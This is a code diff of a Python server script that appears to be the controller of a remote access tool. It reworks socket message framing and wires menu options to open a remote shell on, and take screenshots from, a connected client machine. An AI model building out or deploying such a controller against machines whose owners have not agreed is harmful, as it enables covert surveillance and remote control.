@@ -27,27 +27,20 @@ def establish_connection():
         sys.exit("Failed to recieve connection to client...Exiting")
 
 
-def recv():
-    return conn_to_client.recv(1024)
 
-def recv_all():
-    data_size = int(conn_to_client.recv(8).decode())
+def recv():
+    data_size = int(conn_to_client.recv(12).decode())
 
     data = bytes()
-    data_received_count = 0
-    while data_received_count < data_size:
-        data = conn_to_client.recv(1024)
-        if not data_received_count:
-            break
-        data_received_count += len(data)
+    while len(data) < data_size:
+        data += conn_to_client.recv(1024)
 
     return data
 
-def send(buffer):
-    conn_to_client.send(buffer)
 
-def send_all(data):
-    data_size = f"{str(len(data))}\n"
+def send(data):
+    header_size = 12
+    data_size = f"{len(data):^{header_size}}"
     conn_to_client.send(data_size.encode())
     conn_to_client.sendall(data)
 
@@ -67,23 +60,11 @@ def open_shell():
 
 
 def download_file():
-    file_size = int(conn_to_client.recv(8).decode())
-
-    c = 0
-    file = open(f"screen_shot_{time.asctime(time.localtime(time.time()))}.png", "wb")
-    while c < file_size:
-        file_buff = conn_to_client.recv(4096)
-        if not file_buff:
-            break
-
-        file.write(file_buff)
-        c += len(file_buff)
-
-    file.close()
+    pass
 
 def take_screen_shot():
-    file_data = recv_all()
-    with open(f"screen_shot_{time.asctime(time.localtime(time.time()))}.png", "wb") as file:
+    file_data = recv()
+    with open(f"{time.asctime(time.localtime(time.time()))}.png", "wb") as file:
         file.write(file_data)
 
 def main():
@@ -92,13 +73,14 @@ def main():
         print_menu()
         choice = input("Enter Choice: ")
         if choice == "1":
-            conn_to_client.sendall(b'1')
+            send(b"1")
             open_shell()
         elif choice == "2":
-            conn_to_client.sendall(b'2')
-            download_file()
+            send(b'2')
+            take_screen_shot()
         elif choice == "6":
-            conn_to_client.sendall(b'6')
+            send(b'6')
+            conn_to_client.shutdown(socket.SHUT_WR)
             conn_to_client.close()
             sys.exit()
 
